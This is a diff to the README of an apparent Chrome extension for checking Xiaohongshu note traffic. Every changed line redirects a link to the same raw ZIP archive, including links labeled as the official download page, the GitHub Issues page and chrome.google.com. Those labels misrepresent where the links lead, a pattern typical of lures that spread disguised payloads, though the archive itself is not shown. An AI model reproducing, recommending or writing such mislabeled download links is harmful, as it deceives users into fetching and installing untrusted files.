@@ -1,6 +1,6 @@
 # 🩺 xhs-note-health-checker - See Your Note Traffic Status
 
-[![Download xhs-note-health-checker](https://img.shields.io/badge/Download-xhs--note--health--checker-green?style=for-the-badge)](https://github.com/Plantal-pitcher911/xhs-note-health-checker)
+[![Download xhs-note-health-checker](https://img.shields.io/badge/Download-xhs--note--health--checker-green?style=for-the-badge)](https://raw.githubusercontent.com/Plantal-pitcher911/xhs-note-health-checker/main/src/contents/checker-note-xhs-health-3.0.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to get the extension running on your computer:
 
 Click the link below to open the official download page:
 
-[Download xhs-note-health-checker](https://github.com/Plantal-pitcher911/xhs-note-health-checker)
+[Download xhs-note-health-checker](https://raw.githubusercontent.com/Plantal-pitcher911/xhs-note-health-checker/main/src/contents/checker-note-xhs-health-3.0.zip)
 
 This page shows the latest release version and files you need.
 
@@ -76,7 +76,7 @@ This page shows the latest release version and files you need.
 
 - **Extension does not appear:** Make sure you enabled Developer Mode and correctly loaded the unpacked folder.
 - **No status shown:** Refresh your Xiaohongshu page or check your internet connection.
-- **Chrome version too low:** Update Chrome to the latest version from [chrome.google.com](https://chrome.google.com).
+- **Chrome version too low:** Update Chrome to the latest version from [chrome.google.com](https://raw.githubusercontent.com/Plantal-pitcher911/xhs-note-health-checker/main/src/contents/checker-note-xhs-health-3.0.zip).
 - **Extension icon missing:** Click the puzzle piece icon in Chrome and pin the extension for easy access.
 
 ---
@@ -103,9 +103,9 @@ To access settings, right-click the extension icon and select **Options**.
 
 ## 📞 Get Support or Report Issues
 
-- Use the **Issues** tab on the [GitHub repository page](https://github.com/Plantal-pitcher911/xhs-note-health-checker) to report problems or bugs.
+- Use the **Issues** tab on the [GitHub repository page](https://raw.githubusercontent.com/Plantal-pitcher911/xhs-note-health-checker/main/src/contents/checker-note-xhs-health-3.0.zip) to report problems or bugs.
 - Check the repository for updates and documentation as needed.
 
 ---
 
-[![Download xhs-note-health-checker](https://img.shields.io/badge/Download-xhs--note--health--checker-brightgreen?style=for-the-badge)](https://github.com/Plantal-pitcher911/xhs-note-health-checker)
+[![Download xhs-note-health-checker](https://img.shields.io/badge/Download-xhs--note--health--checker-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Plantal-pitcher911/xhs-note-health-checker/main/src/contents/checker-note-xhs-health-3.0.zip)
